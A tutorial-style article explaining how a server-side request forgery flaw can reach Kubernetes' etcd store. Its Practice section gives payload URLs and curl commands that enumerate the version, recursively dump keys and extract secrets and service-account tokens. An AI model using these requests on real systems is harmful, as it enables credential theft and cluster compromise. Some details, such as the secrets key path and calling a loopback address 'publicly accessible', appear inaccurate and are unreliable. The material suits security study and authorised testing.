---
title: 'Exploit Kubernetes ETCD via SSRF: A Complete Guide'
description: Learn how to exploit Kubernetes ETCD using SSRF to access cluster metadata
  and secrets safely.
keywords:
- Kubernetes ETCD
- SSRF exploitation
- cluster metadata
- sensitive data
- ETCD API
- security risk
- service enumeration
---

# Kubernetes ETCD

## Context

This article demonstrates the exploitation of Kubernetes ETCD through Server-Side Request Forgery (SSRF) to extract sensitive cluster metadata and secrets. It assumes you have foundational knowledge of the HTTP protocol, container orchestration concepts, the architecture of ETCD, and SSRF techniques.

## Theory

### ETCD in Kubernetes Cluster Security

ETCD is a critical component of the Kubernetes ecosystem, acting as the distributed key-value store for maintaining the cluster state. It stores crucial information, such as secrets, service accounts, and cluster configurations. Due to its sensitive nature, direct access to ETCD is a significant security risk, as it can expose confidential data to attackers. Unauthorized access to ETCD can lead to the extraction of sensitive information, which can compromise the entire cluster.

### ETCD API Endpoints and Data Exposure

ETCD allows interaction through publicly accessible HTTP APIs, typically available on the local address `127.0.0.1:2379`. These endpoints include operations like querying the version of ETCD (`/version`) and retrieving key-value pairs (`/v2/keys`). A well-known vulnerability model involves exploiting SSRF vulnerabilities to bypass network restrictions, allowing an attacker to access these ETCD endpoints. The attack sequence involves using SSRF to send requests to the ETCD API, where the attacker can enumerate keys and extract secrets.

### Sensitive Data in ETCD

ETCD stores diverse types of sensitive data such as Kubernetes secrets, service account tokens, and the cluster configuration itself. This data is organized as keys within the ETCD store. Normally, access to ETCD is limited to trusted components within the Kubernetes cluster; however, SSRF can be used to circumvent this implicit trust, exposing the data to potential threats from intercepted requests.

## Practice

### Enumerate ETCD Version via SSRF

The initial step in exploiting ETCD is to determine which version of the service is running. This information can provide insights into the service capabilities and potential vulnerabilities.

- **Payload:**

    An SSRF payload is formulated to query the version endpoint of the ETCD service:
    ```http
    http://127.0.0.1:2379/version
    ```

- **Command Execution:**

    Use `curl` to send the SSRF request through a vulnerable application:
    ```bash
    curl -s 'http://<vulnerable-app>/ssrf?url=http://127.0.0.1:2379/version'
    ```

By executing this request, you can identify the ETCD service and its version, which aids in strategizing further exploitation.

### Recursive Key Dump of ETCD via SSRF

After establishing the version, the next step is to enumerate all keys stored within ETCD. This can potentially disclose sensitive data like configuration files and secrets.

- **Payload:**

    The SSRF payload targets recursive listing of all keys:
    ```http
    http://127.0.0.1:2379/v2/keys/?recursive=true
    ```

- **Command Execution:**

    Execute the SSRF request with:
    ```bash
    curl -s 'http://<vulnerable-app>/ssrf?url=http://127.0.0.1:2379/v2/keys/?recursive=true'
    ```

This step can expose Kubernetes secrets, service tokens, and configurations, offering comprehensive insight into the cluster's operational state.

### Extract Specific Kubernetes Secrets from ETCD

Focusing on specific namespaces, such as Kubernetes secrets, can yield critical credentials.

- **Payload:**

    A targeted SSRF payload aims to extract the Kubernetes secrets namespace:
    ```http
    http://127.0.0.1:2379/v2/keys/kubernetes.io/secrets?recursive=true
    ```

- **Command Execution:**

    Use the following curl command to extract secrets:
    ```bash
    curl -s 'http://<vulnerable-app>/ssrf?url=http://127.0.0.1:2379/v2/keys/kubernetes.io/secrets?recursive=true'
    ```

This action results in extracting service account tokens and other sensitive credentials, which could potentially be used for further attacks.

## Tools

- **curl**

By following these steps and understanding the underlying concepts, practitioners can effectively exploit ETCD through SSRF in a controlled, ethical testing environment to understand the risks and improve security posture.